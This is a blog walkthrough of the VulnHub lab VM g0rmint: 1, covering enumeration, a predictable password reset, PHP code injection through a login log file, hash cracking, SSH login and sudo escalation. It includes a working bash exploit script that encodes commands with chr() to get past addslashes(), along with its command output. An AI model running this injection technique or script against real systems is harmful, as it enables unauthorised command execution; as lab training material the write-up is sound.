---
layout: post
title: "Will the Real Gormint Aunty Please Stand Up?"
category: Walkthrough
tags: [VulnHub, g0rmint]
comments: true
image:
  feature: crowds.jpg
  credit: geralt / Pixabay
  creditlink: https://pixabay.com/en/human-smilies-emoticons-masks-1602493/
---

This post documents the complete walkthrough of g0rmint: 1, a boot2root [VM][1] created by [Noman Riffat][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

The Gormint Aunty is a social media sensation made famous by her "_yeh bik gai hai gormint_" rant to a news reporter. In other words, she's the boss! :sunglasses:

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:4e:fd:98:4e:ae:5d:0c:1d:32:e8:be:c4:5b:28:d9 (RSA)
|_  256 9b:48:29:39:aa:f5:22:d3:6e:ae:52:23:2a:ae:d1:b2 (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/g0rmint/*
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 Not Found
```

Let's start with the web service since there is a disallowed entry `/g0rmint/*` in `robots.txt`. Here's what I see in the browser when I navigate to it.

![robots.txt](/assets/images/posts/g0rmint-walkthrough/g0rmint-3.png)

![login.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-1.png)

### Directory/File Enumeration

Let's enumerate the site with `dirbuster` and see what we get.

![dirbuster](/assets/images/posts/g0rmint-walkthrough/g0rmint-2.png)

```
File found: /g0rmint/config.php - 200
File found: /g0rmint/footer.php - 200
File found: /g0rmint/header.php - 200
File found: /g0rmint/login.php - 200
File found: /g0rmint/mainmenu.php - 200
File found: /g0rmint/reset.php - 200
File found: /g0rmint/dummy.php - 302
File found: /g0rmint/index.php - 302
File found: /g0rmint/logout.php - 302
File found: /g0rmint/profile.php - 302
File found: /g0rmint/secrets.php - 302
```

Among the PHP pages, we can disregard those that returned **302** (because they got redirected back to `/login.php`) and those that returned nothing of value. Only the following pages were interesting:

* `/header.php`
* `/login.php`
* `/mainmenu.php`
* `/reset.php`

Let's explore each page in turn in reverse order starting with `/reset.php`.

### Password Reset Page

Well, the page looked like your normal password reset page. If you know the email address and the username, you'll be able to reset the password.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-8.png)

At this point in time, I'm not aware of any email address or username. :sob:

### Main Menu

This page appeared interesting on the surface but it was the HTML source code that offered a clue on how to proceed.

![mainmenu.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-4.png)

Here's the source code. Noticed that `/secretlogfile.php` was commented out?

![mainmenu.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-5.png)

Navigating to the page got me redirected back to `/login.php`. No luck there. However, it gave me the idea to look at the HTML source code closer for further hints.

### Login Page

Indeed, if you look very closely at the HTML source code of `/login.php`, there was something that stood out.

![login.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-6.png)

A secret backup directory??!!

### Header

This page appeared to contain the headers of the admin portal. The admin's full name was also hardcoded at the dropdown menu - **Noman Riffat.**

![header.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-9.png)

Looking at the HTML source code of this page, one of the CSS proved interesting - `style.css`.

```
/*
* Author: noman
* Author Email: w3bdrill3r@gmail.com
* Version: 1.0.0
* g0rmint: Bik gai hai
* Copyright: Aunty g0rmint
* www: http://g0rmint.com
* Site managed and developed by author himself
*/
```

Could this be the email address and the username of the admin? Well, there is a high chance looking at the name on the header page.

### Directory/File Enumeration (2)

Taking a leaf from the previous enumeration with `dirbuster`, let's give it another shot starting with this path: `/g0rmint/s3cretbackupdirect0ry`.

```
File found: /g0rmint/s3cretbackupdirect0ry/info.php - 200
```

Good. One more page made available.

### Information Page

This page proved to be an really informative one despite the lack of aesthetics. 

![info.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-7.png)

### Backup Archive

The backup archive can be downloaded at `/g0rmint/s3cretbackupdirect0ry/backup.zip`. Let's peek inside the file.

```
# unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-11-02 14:36   s3cr3t-dir3ct0ry-f0r-l0gs/
        0  2017-11-02 03:06   s3cretbackupdirect0ry/
      823  2017-11-02 20:22   config.php
     1251  2017-11-02 20:30   db.sql
      493  2017-11-02 17:01   deletesecretlogfile.php
      154  2017-11-02 17:01   dummy.php
       45  2017-11-02 00:46   footer.php
     5721  2017-11-01 23:45   header.php
     1986  2017-11-01 18:48   index.php
     7426  2017-11-02 17:00   login.php
       99  2017-11-02 17:02   logout.php
      847  2017-11-01 19:02   mainmenu.php
     5113  2017-11-02 17:02   profile.php
     7343  2017-11-02 14:39   reset.php
     2587  2017-11-03 14:22   secretlogfile.php
     2065  2017-11-01 23:42   secrets.php

      +++  ++++++++++++++++   +++

---------                     -------
  6183823                     181 files
```

Sweet. The archive appeared to be the backup of the site.

### Resetting Password

Suffice to say, the most obvious thing to try would be to look at `db.sql` for the admin credential. Unfortunately, the credential (`demo@example.com:demo`) did not work.

![db.sql](/assets/images/posts/g0rmint-walkthrough/g0rmint-16.png)

Since the site backup is available, let's take a look at the password reset mechanism and see if we can gain access into the site by resetting password.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-12.png)

All we have to do is to guess the email address and username. The "new" password would be the first 20 characters from the SHA1 hash of the current GMT date/time. :smirk:

Another advantage we had was the current GMT date/time at the bottom of the password reset page.

Let's give a shot to (`email:w3bdrill3r@gmail.com`) and (`username:noman`) and see what we get.

![reset.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-14.png)

I wrote `reset.sh` to simplify the process of getting the "new" password in plaintext.

{% highlight bash linenos %}
# cat reset.sh
#!/bin/bash

echo -n "$1" | sha1sum | cut -d' ' -f1 | cut -c1-20

# ./reset.sh "Friday 2nd of February 2018 02:08:53 PM"
30e1a63a8968b727f276
{% endhighlight %}
![access](/assets/images/posts/g0rmint-walkthrough/g0rmint-13.png)

The password reset worked!

### Remote Command Execution

Now that I've gained access to the g0rmint Admin Portal, this is also a good time to review the application source code and determine our attack vector.

At the beginning of `/login.php`, it was possible to introduce PHP code of my choice into the site through the `addlog()` function.

![addlog](/assets/images/posts/g0rmint-walkthrough/g0rmint-10.png)

This is how the `addlog()` function in `/config.php` looked like.

![addlog](/assets/images/posts/g0rmint-walkthrough/g0rmint-11.png)

When authentication has failed, the value of the email field is logged to a PHP file at `s3cr3t-dir3ct0ry-f0r-l0gs`, in the format of `"Y-m-d".php`, where `"Y"` is the 4-digit year, `"m"` is the 2-digit month with a leading zero and `"d"` is the 2-digit day with a leading zero. However, an authenticated session must first be established before the PHP file can be viewed or you'll get redirected to the login page. This is because the content of `dummy.php` was written to the top of the file.

![dummy.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-19.png)

I wrote this `bash` script to automate remote command execution.

{% highlight bash linenos %}
# cat exploit.sh
#!/bin/bash

HOST=192.168.198.130
BASE=g0rmint
SECRET=s3cr3t-dir3ct0ry-f0r-l0gs

EMAIL=$1
PASS=$2
COMD=$3

# authenticate
function authenticate() {
    curl -s \
         -c cookie \
         -d "email=$EMAIL&pass=$PASS&submit=submit" \
         http://$HOST/$BASE/login.php &>/dev/null
}

# encode
function encode() {
    for b in $(echo -n "$1" \
               | xxd -p \
               | sed -r 's/(..)/\1 /g'); do
        printf "chr(%d)\n" "0x$b"
    done \
    | tr '\n' '.' \
    | sed 's/.$//g'
    echo
}

# exploit
function exploit() {
    PAYLOAD=$(encode "$COMD")
    DATE=$(date "+%Y-%m-%d")
    curl -s \
         -b cookie \
         http://$HOST/$BASE/deletesecretlogfile.php?file=$DATE.php &>/dev/null
    curl -s \
         --data "email=<?php echo shell_exec($PAYLOAD);?>&pass=&submit=submit" \
         http://$HOST/$BASE/login.php &>/dev/null
    curl -s \
         -b cookie \
         http://$HOST/$BASE/$SECRET/$DATE.php \
    | sed -e 's/Failed login attempt detected with email: //' -e 's/<br>//g' \
    | sed '1d' \
    | sed '$d'
}

# main
authenticate
exploit

# remove cookie jar
rm -rf cookie
{% endhighlight %}

The real workhorse of the script is the `encode()` function. This function turns each ASCII characters of the command string into their ordinals. Each ordinal will go into the PHP `chr()` function and concatenate back as a string. This is to bypass [`addslashes()`](http://php.net/manual/en/function.addslashes.php) that was present in `config.php`.

![addslashes](/assets/images/posts/g0rmint-walkthrough/g0rmint-15.png)

Simply supply the email, password and command as arguments and the script would spit out the result.

```
# ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
...
g0rmint:x:1000:1000:Noman Riffat,,,:/home/g0rmint:/bin/bash
mysql:x:108:117:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
```

### Backup Archive (2)

During enumeration, I spotted the presence of another `backup.zip` at `/var/www`.

```
/var/www:
total 3672
drwxr-xr-x  3 root     root        4096 Nov  3 02:51 .
drwxr-xr-x 12 root     root        4096 Nov  2 03:42 ..
-rw-r--r--  1 root     root     3747496 Nov  3 02:43 backup.zip
drwxr-xr-x  3 www-data www-data    4096 Nov  3 04:08 html
```

I helped myself to the file by copying it to the web root like so.

```
# ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cp /var/www/backup.zip /var/www/html"
```

Next, I downloaded the file using `wget`.

```
# wget http://192.168.198.130/backup.zip
--2018-02-02 14:46:19-- http://192.168.198.130/backup.zip
Connecting to 192.168.198.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3747496 (3.6M) [application/zip]
Saving to: ‘backup.zip’

backup.zip 100%[==================================>] 3.57M --.-KB/s in 0.1s

2018-02-02 14:46:19 (27.6 MB/s) - ‘backup.zip’ saved [3747496/3747496]
```

It appeared to be just like the previous `backup.zip` with a twist. This time round, `db.sql` showed the original admin password hash!

![db.sql](/assets/images/posts/g0rmint-walkthrough/g0rmint-17.png)

The password was revealed to be `"tayyab123"` after going through an online MD5 [cracker][4].

### SSH Login

Let's try using the credentials (`g0rmint:tayyab123`) for a low-privilege shell.

![g0rmint](/assets/images/posts/g0rmint-walkthrough/g0rmint-18.png)

Awesome!

### Privilege Escalation

Noticed that `g0rmint` had successfully `sudo`'d as `root`?

![sudo](/assets/images/posts/g0rmint-walkthrough/g0rmint-20.png)

I sensed the end is near...

![end](/assets/images/posts/g0rmint-walkthrough/g0rmint-21.png)

:dancer:

[1]: https://www.vulnhub.com/entry/g0rmint-1,214/
[2]: https://twitter.com/@nomanriffat
[3]: https://www.vulnhub.com/
[4]: http://md5decrypt.net/
